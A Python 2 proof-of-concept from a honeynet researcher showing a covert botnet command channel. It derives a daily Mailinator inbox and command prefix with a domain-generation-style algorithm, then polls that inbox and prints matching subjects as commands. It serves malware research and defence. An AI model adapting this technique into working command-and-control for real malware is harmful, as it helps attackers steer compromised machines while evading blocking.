import urllib2
import re
import datetime
import time 
"""
    Simple Mail Flux PoC,
    Using Mailinator and a simple mail generation algorithm.
    
    Coded By Shahriyar Jalayeri
    Iran Honeynet Chapter,
    http://www.irhoneynet.org/
"""

class HttpCommand:
    def __init__(self):
        self.lastCommandTime = 0
        self.mailAccount     = None

    def getMessageId(self, index, data):
        idData = ""
        base   = data.find('"id":"', index)+len('"id":"')
        end    = data.find('",', base)
        if base != -1 and end != -1 :
            idData = data[base:end]
        return idData

    def getMessageTime(self, index, data):
        timeData = 0
        base   = data.find('"time":', index)+len('"time":')
        end    = data.find(',', base)
        if base != -1 and end != -1 :
            timeData = int(data[base:end])
        return timeData

    def getMessageSender(self, index, data):
        senderData = ""
        base   = data.find('"fromfull":"', index)+len('"fromfull":"')
        end    = data.find('",', base)
        if base != -1 and end != -1 :
            senderData = data[base:end]
        return senderData

    def getMessageSubject(self, index, data):
        subjectData = ""
        base   = data.find('"subject":"', index)+len('"subject":"')
        end    = data.find('",', base)
        if base != -1 and end != -1 :
            subjectData = data[base:end]
        return subjectData

    def GetNewCommand(self):
        mailDirBase = 0
        mailDirEnd  = 0
        mailDirData = ""
        newCommands = []

        # get the mail address
        mailDataHandle  = urllib2.urlopen("http://mailinator.com/settt?box=" + self.mailAccount + "&time=41414141" )
        mailData        = mailDataHandle.read()
        mailAddress     = mailData[mailData.find('{"address":"') + len('{"address":"') : mailData.find('","')]

        # read maildir
        mailDataHandle  = urllib2.urlopen("http://mailinator.com/grab?inbox="+ self.mailAccount +"&address=" + mailAddress + "&time=41414141" )
        mailData        = mailDataHandle.read()

        index = 0
        while index < len(mailData) :
            index = mailData.find('seconds_ago', index)
            if index == -1 :
                break
            else :
                if self.getMessageTime(index, mailData) > self.lastCommandTime :
                    self.lastCommandTime = self.getMessageTime(index, mailData)
                    newCommands.append(self.getMessageSubject(index, mailData))
                index = index + len('seconds_ago')

        return newCommands

# from http://en.wikipedia.org/wiki/Domain_generation_algorithm
def generateMail(year, month, day):
    mail = ""
 
    for i in range(16):
        year = ((year ^ 8 * year) >> 11) ^ ((year & 0xFFFFFFF0) << 17)
        month = ((month ^ 4 * month) >> 25) ^ 16 * (month & 0xFFFFFFF8)
        day = ((day ^ (day << 13)) >> 19) ^ ((day & 0xFFFFFFFE) << 12)
        mail += chr(((year ^ month ^ day) % 25) + 97)
 
    return mail

def generateCommandPrefix(year, month, day):
    commandPrefix = ""
 
    for i in range(16):
        year = ((year ^ 8 * year) >> 9) ^ ((year & 0xFFFFFFF0) << 11)
        month = ((month ^ 4 * month) >> 3) ^ 12 * (month & 0xFFFFFFF8)
        day = ((day ^ (day << 13)) >> 19) ^ ((day & 0xFFFFFFFE) << 9)
        commandPrefix += chr(((year ^ month ^ day) % 22) + 69)
 
    return commandPrefix

def main():
    currentDate        = datetime.datetime.now()
    todayMailAccount   = generateMail( currentDate.year, currentDate.month, currentDate.day)
    todayCommandPrefix = generateCommandPrefix( currentDate.year, currentDate.month, currentDate.day)

    print "Connecting to Mail Address " + todayMailAccount + "@mailinator.com"
    print "Using Command Prefix " + todayCommandPrefix 
    print "Getting new commands every 1 minute"

    CommandControl = HttpCommand()
    CommandControl.mailAccount = todayMailAccount
    while True :
            Commands = CommandControl.GetNewCommand()
            for comm in Commands :
                if comm.find(todayCommandPrefix) != -1 :
                    print "Command Received : " + comm

            time.sleep(10)

if __name__ == "__main__":
    main()
